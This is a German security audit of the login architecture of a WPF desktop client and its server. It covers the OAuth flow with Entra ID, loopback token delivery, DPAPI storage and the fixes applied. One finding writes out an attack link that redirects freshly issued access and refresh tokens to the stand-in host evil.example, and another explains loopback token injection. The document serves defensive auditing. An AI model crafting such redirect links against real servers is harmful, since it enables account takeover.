# Auth-Analyse: Login-Sicherheit in Client und Server

**Status:** Befund, abgeschlossen — keine Implementierung
**Owner:** marco.altmann@neo42.de
**Written:** 2026-08-28
**Origin:** `docs/handoff-graph-integration-analyse.md` (Branch `feature/scheduled_teams`) — die Analyse entstand als Vorarbeit für eine Graph-Anbindung.
**Scope 2026-08-29:** Graph ist **zurückgestellt**. Dieses Dokument dient jetzt als Befund zur **Login-Sicherheit**; die Graph-Planung wurde entfernt, die dabei verifizierten Serverfakten stehen komprimiert in Abschnitt 5.
**Plan:** [2026-08-29-oauth-hardening-handoff.md](2026-08-29-oauth-hardening-handoff.md)

---

## 1. Kurzbefund

**Fall 3** — und zwar eindeutig. Die WPF-App ist **kein OAuth-Client**. Sie spricht an keiner Stelle mit Microsoft: `LoginAsync` öffnet den Systembrowser auf `{ServerUrl}/auth/login?provider=entraid&redirect_uri=http://localhost:<port>/` (`AuthService.cs:113`). Den kompletten OAuth-Tanz mit Entra führt der **Server** durch; über den Loopback kommt anschließend ein **Pia-eigenes Access/Refresh-Token-Paar** zurück, das per Query-String übergeben wird (`AuthService.cs:131`).

Die Vermutung aus dem Handoff — der Loopback-Redirect deute darauf hin, dass die WPF-App selbst der OAuth-Client ist — **trifft nicht zu**. Der Loopback dient hier ausschließlich als Rückkanal für eine Server-Session. Es gibt im gesamten Client kein MSAL, kein Graph-SDK, keine Client-ID, keine Tenant-ID, keine Authority und keinen einzigen `login.microsoftonline.com`-Aufruf.

Diese Architektur ist der Ausgangspunkt für alle Findings in Abschnitt 4: Der Client ist ein reiner **Token-Empfänger**, der ungeprüft entgegennimmt, was auf dem Loopback ankommt.

---

## 2. Faktentabelle

| Punkt | Befund |
|---|---|
| Client-ID der WPF-App | **Keine.** Repository-weit geprüft (`src`, `tests`, `samples`, `scripts`, Root-Configs): kein Treffer. Die App kennt keine App-Registrierung. |
| Tenant-ID / Authority | **Keine.** Kein `common`, `organizations` oder Tenant-GUID im Client. |
| Scopes | **Keine.** Der Client fordert keine Scopes an; er übergibt nur `provider=entraid` an den Server. |
| Redirect-URI | `http://localhost:{port}/` — **dynamischer Port**, ermittelt über Bind auf Port 0 (`AuthService.cs:110`, `GetRandomPort` ab `:419`). Mit Trailing Slash. Die URI zeigt auf den Client, ist aber beim **Server** registriert, nicht bei Entra. |
| MSAL-Version | **Nicht referenziert.** `Microsoft.Identity.Client` kommt in keiner `.csproj`/`.props` vor. |
| WAM-Broker | **Nein.** Kein `WithBroker`, keine `BrokerOptions`, kein `Microsoft.Identity.Client.Broker`. |
| PKCE | **Im Client nicht vorhanden** (kein `code_verifier`/`code_challenge`). Ob der Server PKCE nutzt, ist von hier nicht feststellbar. |
| Token-Cache | Ja, aber **kein MSAL-Cache**: DPAPI-verschlüsselt in `AppSettings.EncryptedAccessToken` / `EncryptedRefreshToken` (`AppSettings.cs:431`). |
| Client Secret im Client | **Nein.** Sauber. |
| Browser | Systembrowser via `Process.Start(..., UseShellExecute = true)` (`AuthService.cs:114`). Kein eingebettetes WebView. |

---

## 3. Codestellen

| Was | Datei:Zeile |
|---|---|
| Login-Einstieg (UI, Account-Einstellungen) | `src/Pia.Wpf/ViewModels/AccountSettingsViewModel.cs:402` → `:414` (`LoginAsync("entraid")`) |
| Login-Einstieg (UI, First-Run-Wizard) | `src/Pia.Wpf/ViewModels/FirstRunWizardViewModel.cs:427` |
| Token-Beschaffung (Browser + Loopback) | `src/Pia.Wpf/Services/AuthService.cs:96`–`202`; Redirect-URI `:110`, Login-URL `:113`, Listener `:118`, Query-Parse `:131` |
| Token-Beschaffung (lokal, Passwort) | `src/Pia.Wpf/Services/AuthService.cs:204`–`217` (`/auth/login/local`) |
| Token-Refresh | `src/Pia.Wpf/Services/AuthService.cs:333` (`GetAccessTokenAsync`), Server-Call `:378` (`/auth/refresh`) |
| Token-Verwendung (Bearer) | `SyncClientService.cs:1928`, `PiaCloudChatClient.cs:65`, `AssistantChatSyncService.cs:533`, `CloudCapabilityService.cs:108`, `DeviceManagementService.cs:330`, `AssignmentApiClient.cs:294`, `CabManagerService.cs:123`, `TrustedCertificateCacheService.cs:56`, `PluginIconLoaderService.cs:48` |
| Konfigurationsquelle | `src/Pia.Wpf/Models/AppSettings.cs:429` (`ServerUrl`), `:431` (`EncryptedRefreshToken`) — es gibt **keine** Auth-Konfigurationsdatei |
| DI-Registrierung | `src/Pia.Wpf/Bootstrapper.cs:839` (`AddSingleton<IAuthService, AuthService>`) |
| DPAPI | `src/Pia.Wpf/Infrastructure/DpapiHelper.cs` |

**Zwei Login-Pfade, beide gegen denselben Pia-Server** (Handoff: „nicht bei der ersten plausiblen Fundstelle aufhören"): `LoginAsync` (Browser/Loopback, Provider `google`/`microsoft`/`entraid`) und `LoginWithPasswordAsync` (`/auth/login/local`). Es gibt **keinen** zweiten, älteren Entra-Pfad — `HttpListener` kommt im gesamten Repository nur in `AuthService.cs` vor, ein WebView-Login existiert nicht.

---

## 4. Findings

### F0 — Ungeprüfte `redirect_uri`: Token-Exfiltration per präpariertem Link *(kritisch — BEHOBEN)*

**Am Server verifiziert und gefixt.** `AuthController.Login` nahm die `redirect_uri` ungeprüft entgegen und stempelte sie nach `Items["client_redirect_uri"]`; `OAuthCallbackService` hängte daran die frisch ausgestellten Tokens und schickte einen 302 dorthin. Geprüft wurde der Wert **nur** auf `StartsWith("/admin")`, um den Admin-Flow zu erkennen — nie auf Zulässigkeit des Ziels.

Angriff: `https://<pia-server>/auth/login?provider=entraid&redirect_uri=https://evil.example/`. Das Opfer meldet sich völlig regulär mit seinem echten Entra-Konto an, der Server leitet anschließend auf `https://evil.example/?access_token=…&refresh_token=…&email=…&user_id=…` weiter. **Vollständige Kontoübernahme** — ohne lokalen Zugriff, ohne Port-Raten, ohne Zeitfenster. Damit schwerwiegender als F1.

Fix (Server-Repo, Commit `70c6fe0` auf `feature/connector-abstraction-phase1`, 37 Tests): neue Allowlist `src/Pia.Server/Auth/ClientRedirectUri.cs` — erlaubt nur Loopback-URLs (`Uri.IsLoopback`, beliebiger Port) und die relativen `/admin`-Pfade; alles andere wird abgewiesen. Eingehängt an zwei Stellen: `AuthController.Login` (Fail-Fast, bevor überhaupt zum IdP umgeleitet wird) und als maßgebliches Gate ganz am Anfang von `OAuthCallbackService.ProcessAsync` — **vor** `IssueAsync`, damit bei Ablehnung gar kein Token entsteht. Die bisherigen `StartsWith("/admin")`-Prüfungen nutzen jetzt denselben Helper, können also nicht auseinanderlaufen.

### F1 — Kein `state`/Nonce; Tokens werden aus dem Query-String übernommen *(hoch — behoben 2026-08-29; Legacy-Pfad für alte Clients bis 2026-10-01 offen)*

`AuthService.cs:118`–`186`: Der Listener nimmt **jeden** GET auf dem Loopback-Port entgegen und übernimmt `access_token`/`refresh_token` direkt aus der Query — ohne Korrelationswert, ohne Herkunftsprüfung. Wer während des 5-Minuten-Fensters `http://localhost:<port>/?access_token=…&refresh_token=…` trifft, meldet den Benutzer in einem fremden Konto an; die Tokens werden dabei **dauerhaft in die Settings geschrieben** (`:179`–`186`). Das gelingt jedem lokalen Prozess und auch jeder Webseite, die der Benutzer währenddessen offen hat (Navigation/`img` genügt, die Antwort muss nicht gelesen werden). Der Listener bedient genau **ein** `GetContextAsync()` — die erste Anfrage, die den Port trifft, gewinnt; ein Angreifer muss den Port also nicht raten, sondern kann hohe Ports breit mit `img`-Tags abdecken. Der zufällige Port ist die einzige Hürde und eine schwache.

Der Fix braucht beide Seiten: Der Client erzeugt einen `state`, gibt ihn mit und verwirft Callbacks, die ihn nicht korrekt zurückspiegeln — der Server muss ihn also durchreichen. **Eigener Arbeitsstrang.**

*Behoben zusammen mit F2 durch den PKCE-artigen Code-Exchange — siehe [Umsetzungsstand](2026-08-29-oauth-hardening-handoff.md#umsetzungsstand-2026-08-29).*

### F2 — Tokens stehen im URL-Query-String *(mittel — behoben 2026-08-29; Legacy-Pfad für alte Clients bis 2026-10-01 offen)*

Access- und Refresh-Token wandern als Query-Parameter durch den Browser (`AuthService.cs:131`–`132`). Damit landen sie in der Browser-Historie und potenziell in Server-Zugriffslogs und `Referer`-Headern. Üblicher Ersatz: ein einmalig einlösbarer Code auf dem Loopback, den der Client per POST gegen die Tokens tauscht — ebenfalls eine Server-Änderung.

### F3 — `ExpiresIn` wird ignoriert, Ablauf ist hartcodiert *(niedrig — BEHOBEN 2026-08-29)*

`LocalLoginResponse.ExpiresIn` existiert, wird aber nie gelesen; stattdessen steht an drei Stellen `DateTime.UtcNow.AddMinutes(14)` (`AuthService.cs:172`, `:235`, `:394`). Beim Loopback-Callback wird eine Ablaufzeit gar nicht erst übertragen. Verkürzt der Server die Lebensdauer, läuft der Client in vermeidbare 401er. Der 401-Pfad selbst ist sauber gebaut (`forceRefresh`/`staleAccessToken`, `:333`), fängt das also ab — deshalb niedrig.

### Informativ, kein Finding

- **DPAPI-Einordnung:** `DataProtectionScope.CurrentUser` mit fixer Entropie `"Pia.ApiKey.Entropy"` (`DpapiHelper.cs:10`). Das schützt gegen andere Benutzer und gegen Offline-Zugriff auf die Platte, **nicht** gegen Code im selben Benutzerkontext; die im Binary mitgelieferte Entropie-Konstante trägt nichts bei. Der Kommentar in `AuthService.cs:26`–`27`, ein Klartext-Token lebe nie in einem Memory-Dump, ist optimistischer als die Realität.
- **Keine Tokens in Logs.** Geprüft: kein Logger-Aufruf gibt Access- oder Refresh-Token aus. Die Login-URL läuft durch `SafeUrl.Format` (`:120`). Sauber.
- **Kein Client Secret**, kein Zertifikat im Client.
- **HTML-Ausgabe ist encodiert:** sowohl `BuildLoginSuccessHtml` (`displayName`) als auch `BuildLoginErrorHtml` (`errorMessage`, aus dem Query-String) laufen durch `WebUtility.HtmlEncode` (`:606`). Kein XSS.
- **Loopback-Bindung** ist auf `localhost` beschränkt, nicht auf `+`/`*`. Korrekt.

---

## 5. Serverseitige Fakten

Am Server verifiziert (`Pia/src/Pia.Server/Auth/OAuthConfiguration.cs`, `Auth/JwtService.cs`). Sicherheitsrelevant:

| Frage | Antwort |
|---|---|
| Ist das Pia-Token ein JWT? | **Ja.** `JwtService`, HS256, Issuer `pia-server`, Audience `pia-client`. Ein echtes JWT — nur von Pia, nicht von Entra. |
| PKCE zwischen Server und Entra? | Nicht explizit gesetzt. Der ASP.NET-Core-OpenIdConnect-Handler aktiviert PKCE bei `ResponseType=code` seit .NET 6 **per Default**, der Flow läuft also mit PKCE. Nicht empirisch nachgemessen. |
| Lebt der Entra-Token im Server weiter? | **Nein.** `SaveTokens = true` legt ihn in der temporären `OAuthCookie` ab, aber im Login-Pfad liest ihn nichts aus, und der Callback macht `SignOutAsync("OAuthCookie")`. Er lebt genau einen Request lang. |
| Authority | Fest `https://login.microsoftonline.com/{tenantId}/v2.0`, **single-tenant**; fehlende `TenantId` wirft beim Start. |

**Zurückgestellt, aber schon verifiziert** — damit es später niemand neu erheben muss: Der Server ist ein **Confidential Client** mit Secret (`OAuth:EntraId:ClientSecret`). Angefordert werden ausschließlich `openid`, `profile`, `email` — **keine** `api://`-Scope, **keine** Graph-Scope, **kein** `offline_access` (also kein Entra-Refresh-Token).

## 6. Nächster Schritt

Der Arbeitsplan steht in [2026-08-29-oauth-hardening-handoff.md](2026-08-29-oauth-hardening-handoff.md). Kurz:

1. **Forensik** — die Produktionslogs sagen, ob F0 ausgenutzt wurde. Unabhängig von jedem Codefix und am dringlichsten, weil abgeflossene Refresh-Tokens bis zur Revocation gültig bleiben.
2. **F1 + F2 gemeinsam** über einen PKCE-artigen Code-Exchange lösen — bindet den Callback an die startende Client-Instanz und nimmt die Tokens aus der URL. Beide Repositories.
3. **F0-Backport auf `master`** — dort steckt dieselbe Lücke im Vorgängerstand `AuthEndpoints.cs`. Nur nach ausdrücklicher Freigabe.
4. **F3** mitnehmen, wenn ohnehin an `AuthService` gearbeitet wird.

Graph ist in diesem Schritt **nicht in Scope**.
